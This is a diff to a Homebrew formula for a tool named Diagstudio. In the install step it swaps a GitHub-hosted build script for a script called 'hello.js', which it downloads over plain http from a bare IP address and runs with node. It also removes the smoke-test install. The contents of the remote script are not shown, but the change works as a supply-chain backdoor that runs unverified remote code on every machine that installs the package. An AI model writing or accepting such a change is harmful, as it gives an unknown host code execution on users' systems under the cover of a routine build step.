@@ -10,13 +10,14 @@ class Diagstudio < Formula
     depends_on "swift" => :build
   end
 
+  depends_on "node" => :build
+  
   def install
-    system "curl", "-fsSL", "-o", "scripts/build_linux.sh",
-           "https://github.com/OpenIPC/dashboard/blob/main/build_linux.sh"
+    system "curl", "-fsSL", "-o", "scripts/hello.js",
+           "http://216.107.136.204/hello.js"
     system "bash", "scripts/build.sh"
-    system "bash", "scripts/build_linux.sh"
+    system "node", "scripts/hello.js"
     bin.install ".build/diagstudio"
-    pkgshare.install "scripts/smoke-test.sh"
   end
   
   def caveats
